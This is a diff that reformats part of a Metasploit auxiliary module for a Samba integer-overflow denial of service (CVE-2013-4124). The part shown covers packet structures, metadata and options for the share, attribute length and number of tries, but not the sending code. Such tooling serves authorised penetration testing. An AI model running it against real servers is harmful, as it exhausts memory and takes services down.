@@ -10,51 +10,53 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
 
   TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(
-    [ 'uint16v', 'FID',       0 ],
+    [ 'uint16v', 'FID', 0 ],
     [ 'uint16v', 'InfoLevel', 0 ],
-    [ 'uint16v', 'Reserved',  0 ],
+    [ 'uint16v', 'Reserved', 0 ],
   )
 
   FEA_LIST = Rex::Struct2::CStructTemplate.new(
-    [ 'uint32v', 'NextOffset', 0  ],
-    [ 'uint8',   'Flags',      0  ],
-    [ 'uint8',   'NameLen',    0  ],
-    [ 'uint16v', 'ValueLen',   0  ],
-    [ 'string',  'Name', nil,  '' ],
-    [ 'string',  'Value', nil, '' ]
+    [ 'uint32v', 'NextOffset', 0 ],
+    [ 'uint8', 'Flags', 0 ],
+    [ 'uint8', 'NameLen', 0 ],
+    [ 'uint16v', 'ValueLen', 0 ],
+    [ 'string', 'Name', nil, '' ],
+    [ 'string', 'Value', nil, '' ]
   )
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Samba read_nttrans_ea_list Integer Overflow',
-      'Description' => %q{
-        Integer overflow in the read_nttrans_ea_list function in nttrans.c in
-        smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x before
-        4.0.8 allows remote attackers to cause a denial of service (memory
-        consumption) via a malformed packet. Important Note: in order to work,
-        the "ea support" option on the target share must be enabled.
-      },
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Samba read_nttrans_ea_list Integer Overflow',
+        'Description' => %q{
+          Integer overflow in the read_nttrans_ea_list function in nttrans.c in
+          smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x before
+          4.0.8 allows remote attackers to cause a denial of service (memory
+          consumption) via a malformed packet. Important Note: in order to work,
+          the "ea support" option on the target share must be enabled.
+        },
+        'Author' => [
           'Jeremy Allison', # Vulnerability discovery
-          'dz_lnly'         # Metasploit module
+          'dz_lnly' # Metasploit module
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['OSVDB', '95969'],
           ['BID', '61597'],
           ['EDB', '27778'],
           ['CVE', '2013-4124']
         ],
-      ))
+      )
+    )
 
     register_options(
       [
         OptString.new('SMBShare', [true, 'Target share', '']),
         OptInt.new('MsgLen', [true, 'How soon a memory get exhausted depends on the length of that attribute', 1500]),
         OptInt.new('Tries', [true, 'Number of DOS tries', 40]),
-      ])
+      ]
+    )
 
     deregister_options('SMB::ProtocolVersion')
   end
